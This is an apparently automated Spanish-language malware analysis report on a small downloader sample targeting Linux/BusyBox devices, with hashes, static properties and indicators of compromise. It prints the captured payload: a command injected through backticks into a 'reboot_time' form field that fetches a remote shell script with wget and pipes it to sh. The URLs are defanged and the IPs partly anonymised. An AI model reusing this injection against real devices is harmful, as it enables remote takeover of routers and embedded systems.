# 🧬 Payload Analysis

`c51087a1e6d9b726ce85b9a616cd37c0bb747b3a00929d885bfc439585cea100`

## 📌 Resumen

Texto ASCII de 334 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://91.92.40.XXX/wget.sh -O-`
2. `sh -s wdr3`
3. `busybox wget hxxp://91.92.40.XXX/w` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/c51087a1e6d9b726ce85b9a616cd37c0bb747b3a00929d885bfc439585cea100.md](../../../../../malware-like/oraculo/downloader/c51087a1e6d9b726ce85b9a616cd37c0bb747b3a00929d885bfc439585cea100.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `c51087a1e6d9b726ce85b9a616cd37c0bb747b3a00929d885bfc439585cea100`
- **MD5:** `a68208d0de1721f069aca0a8346a9aff`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 334 B |
| Entropía | 5.2 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
reboot_enabled=1&reboot_time=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s wdr3;busybox wget hxxp://91.92.40.XXX/w
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | reboot_enabled=1&reboot_time=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s wdr3;busybox wget hxxp://91.92.40.XXX/w | strings |
| hash | c51087a1e6d9b726ce85b9a616cd37c0bb747b3a00929d885bfc439585cea100 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
